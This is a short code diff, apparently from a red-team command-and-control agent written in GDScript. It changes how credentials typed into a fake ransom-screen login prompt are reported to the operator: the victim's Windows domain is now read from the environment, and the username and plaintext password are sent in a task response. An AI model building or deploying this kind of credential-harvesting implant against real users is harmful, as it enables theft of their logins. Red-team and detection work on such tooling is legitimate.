@@ -62,6 +62,11 @@ func _on_tasking_ransom(task):
 
 func _on_GUI_verify_username_password(username, password):
 	hide() # TODO: or just keep it up until the redteam member decides it should go away?
+	
+	var realm = "UNKNOWN REALM"
+
+	if OS.has_environment("USERDOMAIN"):
+		realm = OS.get_environment("USERDOMAIN")
 
 	api.agent_response(
 		api.create_task_response(
@@ -72,8 +77,9 @@ func _on_GUI_verify_username_password(username, password):
 			[],
 			[
 				{
+					"comment": "untrusted credential source (ransom screen)",
 					"credential_type": "plaintext",
-					"realm": "spooky.local",
+					"realm": realm,
 					"credential": password,
 					"account": username,
 				}
